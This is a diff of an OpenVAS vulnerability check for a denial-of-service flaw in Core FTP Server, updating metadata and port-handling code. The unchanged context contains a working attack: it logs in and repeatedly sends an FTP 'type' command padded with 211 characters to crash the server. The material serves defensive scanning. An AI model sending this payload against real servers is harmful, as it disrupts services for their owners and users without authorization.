@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_core_ftp_server_type_cmd_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_core_ftp_server_type_cmd_dos_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # Core FTP Server 'Type' Command Remote Denial of Service Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802613");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-05 10:57:53 +0530 (Mon, 05 Mar 2012)");
   script_name("Core FTP Server 'Type' Command Remote Denial of Service Vulnerability");
 
@@ -69,20 +69,13 @@ if(description)
   script_family("FTP");
   script_dependencies("secpod_ftp_anonymous.nasl");
   script_require_ports("Services/ftp", 21);
+
   exit(0);
 }
 
 include("ftp_func.inc");
 
-ftpPort = get_kb_item("Services/ftp");
-if(! ftpPort){
-  ftpPort = 21;
-}
-
-if(! get_port_state(ftpPort)){
-  exit(0);
-}
-
+ftpPort = get_ftp_port(default:21);
 banner = get_ftp_banner(port:ftpPort);
 if(! banner || "Core FTP Server" >!< banner){
   exit(0);
@@ -93,14 +86,13 @@ pass = get_kb_item("ftp/password");
 
 if(! user){
   user = "anonymous";
-  pass = "openvas@";
+  pass = "user@";
 }
 
 exploit = "type " + crap(211);
 
 for (i = 0; i < 3; i++)
 {
-  ## Open FTP Socket
   soc = open_sock_tcp(ftpPort);
   if(! soc){
     exit(0);
@@ -113,7 +105,6 @@ for (i = 0; i < 3; i++)
     exit(0);
   }
 
-  ## Send the Attack Request
   ftp_send_cmd(socket:soc, cmd:exploit);
   ftp_close(socket:soc);
   sleep(1);
